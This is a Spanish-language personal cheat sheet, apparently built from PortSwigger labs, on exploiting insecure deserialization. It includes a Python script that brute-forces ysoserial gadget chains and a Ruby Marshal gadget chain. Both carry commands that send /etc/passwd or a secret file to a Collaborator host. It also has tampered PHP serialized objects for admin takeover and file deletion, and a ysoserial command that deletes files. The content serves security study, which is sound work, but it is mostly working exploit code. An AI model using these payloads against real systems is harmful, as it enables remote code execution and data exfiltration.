# Reconocimiento Rápido: 

> SIEMPRE analizar las cookies A MANO, un escaner podrá o no podrá identificar la deserialización insegura, pero nuestra cabeza, siempre podrá si estamos lo suficientemente preparados. 

COOKIE MUY LARGA --> OJOOOOOO!!

| Object Type     | Header (Hex) | Header (Base64) |
| --------------- | ------------ | --------------- |
| Java Serialized | AC ED        | rO              |
| .NET ViewState  | FF 01        | /w              |
| Python Pickle   | 80 04 95     | gASV            |
| PHP Serialized  | 4F 3A        | Tz              |

CommonsCollections7 'curl https://j5ppeqf3n37txn28onrhlmku3l9cx5lu.oastify.com -d @/home/carlos/secret'
# Importante: ⚠️

Para reconocer posibles puntos de entrada para su exploit, busque firmas que tengan todos los objetos serializados de Java:

- La firma comienza con AC ED 00 05 en hexadecimal o ro0 en Base64 (por ejemplo, puede encontrarlas dentro de solicitudes HTTP como cookies o parámetros)
- Encabezado de tipo de contenido de una respuesta HTTP establecida en application/x-java-serialized-object.
## Script To Brute Force JAVA Deserialization: 
```python
#!/bin/python3
import os, random

burp_collab_link = "6szviq1i5ag33um9o5ya4rox7odg19py.oastify.com" # Used in testing if the command executed # CHANGE

jar_filename = "ysoserial-all.jar"

filename = "exploitsInBase64.txt" # for writing the output
open(filename, 'w').close() # (clear/create) the file

# ysoserial Payloads that will be tried
payloads = ['AspectJWeaver', 'BeanShell1', 'C3P0', 'Click1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'FileUpload1', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JRMPListener', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'Jython1', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'URLDNS', 'Vaadin1', 'Wicket1']


# Generate Exploits
for p in payloads:
    # Distinguish the lookup command by adding a number before the burp collab link.
    rceCommand_nslookup = f"nslookup {p}.{burp_collab_link}"
    rceCommand_exfiltrateFile = f"wget --post-file /home/carlos/secret {p}.{burp_collab_link}"

    cmdOnServer =  rceCommand_exfiltrateFile # CHANGE

    os.system(f"echo \#{p} >> {filename}")

    ####### commment 1 of the commands # CHANGE
    # Gzip the base64
    command = f"/usr/lib/jvm/java-8-openjdk/jre/bin/java -jar {jar_filename} {p} '{cmdOnServer}' | gzip -f | base64 | tr --delete '\\n' >> {filename}"

    # base64 only
    # command = f"/usr/lib/jvm/java-8-openjdk/jre/bin/java -jar {jar_filename} {p} '{cmdOnServer}' | base64 | tr --delete '\\n' >> {filename}"

    os.system(command)

    for i in range(2): os.system(f"echo >> {filename}") # write 4 lines
```

---

1. Decodear cookie y cambiar valor booleano a 1
```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
```

2. Decodear cookie y cambiar valores:
```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"xljyz3id9jx3opb91y2gd6gsj1zt0kr1";}
```
--> Lo cambiamos a esto:
```php
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";b:1;}
```
(Modificamos el id junto a su longitud, y cambiamos al access token a un booleano en TRUE)

3. Habia ruta a un pfp el cual podemos modificar cambiando su longitug del 's' y borra el archivo que queramos:
```php
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"mvquzwgs2off1203isaxi32z0d5oxb6p";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
```

4. Are there interesting files exposed?
	1. Intentas leer el backup de vim con  (~)? GET /libs/CustomTemplate.php~
	2. Creas un objeto custom.
![[Pasted image 20260727134811.png]]
```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"dvt6huggv1p5slintug8zy9s7pjn10c8";}
```
--> Crafteamos un objeto nuevo:
```php
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

5. Apache Commons:
	1. Las cookies de Java comienzan por **'rOO...'**
	2. Descargamos el YSOSERIAL.jar : https://github.com/frohoff/ysoserial/releases/tag/v0.0.6
	3. Probamos payloads con los distintos CommonsCollections{1,2,3,4}
```bash
java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0;
 echo
```
	4. Cuando tenemos el que queremos lo pegamos y copiamos el de arriba para el formato URL-Encode

![[Pasted image 20260727142904.png]]

6. PHP deserialization:

------------------------------------------------------------------------- 

Checklist:
```
1. Decode Cookie
2. Try Changing values/data types and observer error
3. Are there any paths on the cookies
4. Are there interesting files exposed?
	1. Can you read them appending tilde (~)? GET /libs/CustomTemplate.php~
	2. Can you create a new object that get serialized?
	3. O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
5. Is it a java cookie? Try prebuilt gadgets with ysoserial
6. Is it a php obj cookie? Try gadgets of phpgcc
7. Is it Ruby? Try documented ruby gadgets of vakzz
```

---
## Payload -`Pro Tip BSCP`

```rb
require 'net/http'  # Cargar la librería de red estándar
require 'base64'

# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "wget https://COLLAB.com --post-file=/etc/passwd")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])

# Convert the payload to Base64
encoded_payload = Base64.encode64(payload)

puts "Payload en Base64 mi Papacho:"
puts encoded_payload
```

![[Pasted image 20260810213426.png]]

